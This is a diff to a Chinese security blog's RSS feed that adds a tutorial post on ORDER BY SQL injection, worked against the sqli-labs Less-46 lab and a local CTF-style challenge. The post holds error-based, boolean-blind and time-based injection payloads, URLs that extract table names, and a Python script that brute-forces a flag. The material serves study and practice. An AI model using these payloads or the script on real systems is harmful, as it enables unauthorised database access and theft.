@@ -5,13 +5,93 @@
         <link>https://kiyomijin.github.io</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Sun, 02 Oct 2022 00:29:51 +0800</pubDate>
-        <lastBuildDate>Sun, 02 Oct 2022 00:29:51 +0800</lastBuildDate>
+        <pubDate>Sun, 02 Oct 2022 12:59:34 +0800</pubDate>
+        <lastBuildDate>Sun, 02 Oct 2022 12:59:34 +0800</lastBuildDate>
         <category>原创</category>
         <category>SQL注入探究</category>
         <category>数据库安全</category>
         <category>CTF小训</category>
         <category>Misc</category>
+        <item>
+            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/</guid>
+            <title>OrderBy注入</title>
+            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/</link>
+            <category>SQL注入探究</category>
+            <pubDate>Sun, 02 Oct 2022 12:59:34 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;有趣的order-by注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有趣的order-by注入&#34;&gt;#&lt;/a&gt; 有趣的 Order by 注入&lt;/h1&gt;
+&lt;p&gt;下面介绍几个从 ThreeZh1 师傅那里学到的几个有趣的 SQL 注入&lt;/p&gt;
+&lt;h2 id=&#34;常规order-by注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常规order-by注入&#34;&gt;#&lt;/a&gt; 常规 Order by 注入&lt;/h2&gt;
+&lt;p&gt;先来看一下 Order by 注入的原理&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT username, password FROM users order by 1 asc;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这是一个常见的 order by 使用语句，order by 后面的数字 1 是第 1 个列的意思 (&lt;strong&gt;也可以指定列名&lt;/strong&gt;)， &lt;code&gt;asc &lt;/code&gt; /  &lt;code&gt;desc&lt;/code&gt;  指定是升序还是降序。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：在 order by 后面的不会根据计算的结果来排序。&lt;/p&gt;
+&lt;p&gt;这里有以下几种方式来进行测试：&lt;/p&gt;
+&lt;h3 id=&#34;order-by-报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#order-by-报错注入&#34;&gt;#&lt;/a&gt; order by + 报错注入&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by extractvalue(1,concat(0x7e, @@version,0x7e)) 进行报错注入&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;order-by-布尔盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#order-by-布尔盲注&#34;&gt;#&lt;/a&gt; order by  + 布尔盲注&lt;/h3&gt;
+&lt;p&gt;rand () 会返回一个 0 和 1 之间的随机数，如果括号内参数被赋值，同一个参数会返回同一个数。&lt;/p&gt;
+&lt;p&gt;这里就可以用 mid（也就是 substr 函数）来构造布尔盲注的方式来进行注入&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by rand(mid(version(),1,1)=5)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;order-by-0的数-and时间盲注方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#order-by-0的数-and时间盲注方式&#34;&gt;#&lt;/a&gt; order by + (&amp;gt;0 的数) +and + 时间盲注方式&lt;/h3&gt;
+&lt;p&gt;在 order by 后面的不会根据计算的结果来排序，但是计算还是会运行。&lt;/p&gt;
+&lt;p&gt;也就是，当我们的 payload 有延迟命令的时候，页面还是会延迟的。&lt;/p&gt;
+&lt;p&gt;使用 and 连接时间盲注 payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by 1 and (if(substr(version(),1,1)=5,0,sleep(5)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里用 &lt;code&gt;sqllib-Less46&lt;/code&gt;  作为一个学习的例子：&lt;/p&gt;
+&lt;p&gt;它的源代码为：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$id=$_GET[&amp;#x27;sort&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT * FROM users ORDER BY $id&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002115154304.png&#34; alt=&#34;image-20221002115154304&#34;&gt;&lt;/p&gt;
+&lt;p&gt;那么可以 &lt;code&gt;将这个1替换成查询语句&lt;/code&gt; ，因为 &lt;code&gt;查询成功&lt;/code&gt; 的结果就是 &lt;code&gt;返回1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：如果对上述这一句有疑问，请看下图&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = (select 2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002120406540.png&#34; alt=&#34;image-20221002120406540&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002120420706.png&#34; alt=&#34;image-20221002120420706&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002120434503.png&#34; alt=&#34;image-20221002120434503&#34;&gt;&lt;/p&gt;
+&lt;p&gt;OK，那就可以有&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,version(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#与下面一句等效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,version(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002115341706.png&#34; alt=&#34;image-20221002115341706&#34;&gt;&lt;/p&gt;
+&lt;p&gt;读表：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,(select group_concat(table_name)) from information_schema.tables where table_schema=database(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#与下面一句等效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002115558719.png&#34; alt=&#34;image-20221002115558719&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;另外一种order-by-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#另外一种order-by-注入&#34;&gt;#&lt;/a&gt; 另外一种 Order by 注入&lt;/h2&gt;
+&lt;p&gt;ThreeZh1 自己写了一个题来学习这一种 order by 注入。&lt;/p&gt;
+&lt;p&gt;题目过滤了 F1g3 这个字段名。 &lt;code&gt;在id=3时&lt;/code&gt; ，F1g3 字段存在 flag 的 base16 编码。(直接过滤 Flag 会更好)&lt;/p&gt;
+&lt;p&gt;查询语句：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &amp;quot;.$id.&amp;quot;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1g3，列号为 2&lt;/p&gt;
+&lt;p&gt;因为过滤了 F1g3 这个字段名，我们不能直接用普通盲注的方式得到 Flag，所以就得使用一种特别的 order by 盲注。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002120830210.png&#34; alt=&#34;image-20221002120830210&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;尝试报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试报错&#34;&gt;#&lt;/a&gt; 尝试报错&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这个就是错误页面，意味着报错，那么大概率就是不带单引号的整型注入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002120931642.png&#34; alt=&#34;image-20221002120931642&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;尝试不报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试不报错&#34;&gt;#&lt;/a&gt; 尝试不报错&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;尝试获取列数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试获取列数&#34;&gt;#&lt;/a&gt; 尝试获取列数&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by 3 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by 4 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;获取列数为 3&lt;/p&gt;
+&lt;h3 id=&#34;尝试获取数据库版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试获取数据库版本&#34;&gt;#&lt;/a&gt; 尝试获取数据库版本&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: oops,This is not the flag id &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,version() #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;既然，直接报错注入的方式不可行，那么我们换一种思路，用 order by&lt;/p&gt;
+&lt;p&gt;可以直接用 order by 么？&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 order by extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;服，那就尝试先来排序。由于 id=1、id=2 时，都不是 flag 所对应的 id，根据题目，我们知道 flag 在 id=3 所在行。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id=3 union select 1,2,3 order by 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=3 union select 4,2,3 order by 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 4 name: 3 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;根据这个差异，我们可以指定按第二列来排序，并在 select 里猜测 flag 的值。这样就可以不使用 F1g3 这个字段名就把值读出来。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=3 union select 1,&amp;#x27;6&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=3 union select 1,&amp;#x27;7&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;出现差别了，因为这里是首字符不等于’7’才会出现排序不一样，所以 flag 的第一个字符为’6’。&lt;/p&gt;
+&lt;p&gt;按照这个思路，写出脚本：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; id: 3 &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; name: threezh1 &amp;lt;/td&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; id: 1 &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; name: 3 &amp;lt;/td&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/threezh1/index.php?&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_flag&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;id=3 union select 1,&amp;#x27;&amp;#123;0&amp;#125;&amp;#x27;,3 order by 2&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(flag + j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			content = requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; content.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				flag = flag + temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#print(flag)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; j == &lt;span class=&#34;string&#34;&gt;&amp;#x27;Z&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			length = i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag is:&amp;quot;&lt;/span&gt;,flag,&lt;span class=&#34;string&#34;&gt;&amp;quot;length is:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_flag()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002124705182.png&#34; alt=&#34;image-20221002124705182&#34;&gt;&lt;/p&gt;
+&lt;p&gt;附上源码查询&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&amp;#x27;7&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002125748813.png&#34; alt=&#34;image-20221002125748813&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&amp;#x27;6&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221002125810127.png&#34; alt=&#34;image-20221002125810127&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</guid>
             <title>SQL注入读写文件</title>
